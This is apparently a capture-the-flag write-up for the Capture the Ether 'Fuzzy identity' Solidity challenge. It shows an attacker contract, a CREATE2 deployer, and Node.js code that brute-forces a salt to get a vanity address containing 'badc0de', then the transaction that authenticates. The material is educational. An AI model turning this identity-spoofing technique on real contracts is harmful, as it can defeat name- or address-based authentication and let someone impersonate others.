# 15. Fuzzy identity

This contract can only be used by me (smarx). I don’t trust myself to remember my private key, so I’ve made it so whatever address I’m using in the future will work:

I always use a wallet contract that returns “smarx” if you ask its name.
Everything I write has bad code in it, so my address always includes the hex string badc0de.
To complete this challenge, steal my identity!

## Target contract

```solidity
pragma solidity ^0.4.21;

interface IName {
    function name() external view returns (bytes32);
}

contract FuzzyIdentityChallenge {
    bool public isComplete;

    function authenticate() public {
        require(isSmarx(msg.sender));
        require(isBadCode(msg.sender));

        isComplete = true;
    }

    function isSmarx(address addr) internal view returns (bool) {
        return IName(addr).name() == bytes32("smarx");
    }

    function isBadCode(address _addr) internal pure returns (bool) {
        bytes20 addr = bytes20(_addr);
        bytes20 id = hex"000000000000000000000000000000000badc0de";
        bytes20 mask = hex"000000000000000000000000000000000fffffff";

        for (uint256 i = 0; i < 34; i++) {
            if (addr & mask == id) {
                return true;
            }
            mask <<= 4;
            id <<= 4;
        }

        return false;
    }
}
```

## Vulnerability

This is not a vulnerability, more of an address generation challenge. We must generate a smart contract that has the following function :

```solidity
    function name() public pure returns (bytes32) {
        return "smarx";
    }
```

A full version of the contract could be :

```solidity
contract Attacker {

    address targetContract;

    constructor(address _targetContract) {
        targetContract = _targetContract;
    }

    function attack() public {
        (bool success, ) = targetContract.call(abi.encodeWithSignature("authenticate()"));
        require(success == true, "Could not authenticate");
    }

    function name() public pure returns (bytes32) {
        return "smarx";
    }
}
```

And whose address contains `badc0de`. I decided to use `create2` which allow you to create a new contract with a deterministic address given a specific salt (seed).

So first I deployed a factory contract: `Deployer`

```solidity
contract Deployer {

    address targetContract;

    constructor(address _targetContract) {
        targetContract = _targetContract;
    }

    function attack(uint256 salt) public {
        Attacker attacker = new Attacker{salt: bytes32(salt)}(targetContract);
        attacker.attack();
    }
}
```

Then, in nodejs I looked (brute forced) for a salt that would give an address containing `badc0de` :

As a helper, I used `eth-create2-calculator

```js
import { calculateCreate2 } from "eth-create2-calculator";
```

Then incrementally looked for a good salt (this is very similar to mining in a way) :

```js
// CHANGE THIS FOR THE DEPLOYEMENT BYTECODE OF THE ATTACKER CONTRACT : present in the ABI
const bytecode = ""; 

// CHANGE THIS TO THE ADDRESS OF YOUR CHALLENGE CONTRACT
const challengeContract = "0x0eA4c6B675f136F790f4583E6503fF2ffF14CEee";

// CHANGE THIS TO THE ADDRESS OF YOUR DEPLOYER CONTRACT
const deployerContract = "0x17Aa8Bd168809e2ea26A0E906E550afb0A8Ef58F";
let salt = new web3.utils.BN("-1");

let addr = "";

do {
  salt = salt.add(new web3.utils.BN("1"));

  addr = calculateCreate2(
    deployerContract,
    web3.utils.padLeft(web3.utils.numberToHex(salt), 64),
    bytecode,
    {
      params: [challengeContract],
      types: ["address"],
    }
  );
} while (addr.includes("badc0de") == false);

console.log(`Found salt : ${web3.utils.numberToHex(salt)} Address : ${addr}`);
```

For me the first salt matching the conditions was : `0x461fac6` giving the address : `0x93F9E7ff3badc0deD9FB938c8Bda1f189985fD85`.

We only need to call the deployer with the salt that we just found:

```js
// CHANGE THIS TO THE ADDRESS OF YOUR DEPLOYER CONTRACT
const deployerContract = "0x17Aa8Bd168809e2ea26A0E906E550afb0A8Ef58F";

// CHANGE THIS TO THE SALT YOU FOUND AT THE PREVIOUS STEP
const salt = "0x461fac6";

const data = web3.eth.abi.encodeFunctionCall(
  {
    name: "attack",
    type: "function",
    inputs: [{ type: "uint256", name: "salt" }],
  },
  [salt]
);

await web3.eth.sendTransaction({
  from: accounts[0],
  to: deployerContract,
  data: data,
});
```

You can submit the challenge !